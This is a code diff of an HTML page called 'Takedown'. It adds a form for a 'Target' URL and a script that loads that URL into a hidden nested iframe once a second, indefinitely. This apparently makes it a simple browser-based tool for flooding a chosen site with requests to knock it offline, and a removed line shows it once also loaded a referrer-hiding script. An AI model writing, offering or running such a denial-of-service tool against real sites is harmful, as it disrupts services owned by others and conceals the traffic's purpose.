@@ -1,10 +1,72 @@
 <html>
     <head>
         <title>Takedown</title>
+
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+
+        <link href="bower_components/bootstrap/dist/css/bootstrap.min.css" rel="stylesheet">
+
+        <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+        <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+        <!--[if lt IE 9]>
+          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+        <![endif]-->
     </head>
     <body>
-        <script src="bower_components/jquery/jquery.min.js"></script>
-        <script src="bower_components/boostrap.min.js"></script>
-        <script src="referrer-killer/referrer-killer.js"></script>
+        <div class="container">
+            <h1>Takedown</h1>
+
+            <form>
+                <div class="form-group">
+                    <label for="target">Target</label>
+                    <input type="text" class="form-control" id="target" placeholder="www.example.com" value="http://localhost:9999">
+                </div>
+            </form>
+        </div>
+
+        <iframe scrolling="no" frameborder="no" allowtransparency="true" id="requester" style="visibility:hidden"></iframe>
+
+        <script src="bower_components/jquery/dist/jquery.min.js"></script>
+        <script src="bower_components/bootstrap/dist/js/bootstrap.min.js"></script>
+
+        <script>
+            var iframe = document.createElement('iframe');
+            iframe.src = "about:blank";
+            document.getElementsByTagName("iframe")[0].contentDocument.body.innerHTML = "";
+            document.getElementsByTagName("iframe")[0].contentDocument.body.appendChild(iframe);
+             
+            function request(url) {
+                console.log("request: " + Date() + ", url: " + url);
+                var iframe = document.getElementsByTagName("iframe")[0].contentDocument.body.getElementsByTagName("iframe")[0];
+                iframe.src = url;
+            }
+             
+            function time(callback) {
+                var date = new Date();
+             
+                var interval = 1;
+             
+                var current = date.getSeconds() * 1000 + date.getMilliseconds();
+                var delta = 59999 - current;
+             
+
+                delta = 0;
+
+                setTimeout(function() {
+                    callback();
+             
+                    setInterval(function() {
+                        callback();
+                    }, interval * 1000);
+                }, delta);
+            }
+             
+            time(function() {
+                request($("#target").val());
+            });
+        </script>
     </body>
 </html>
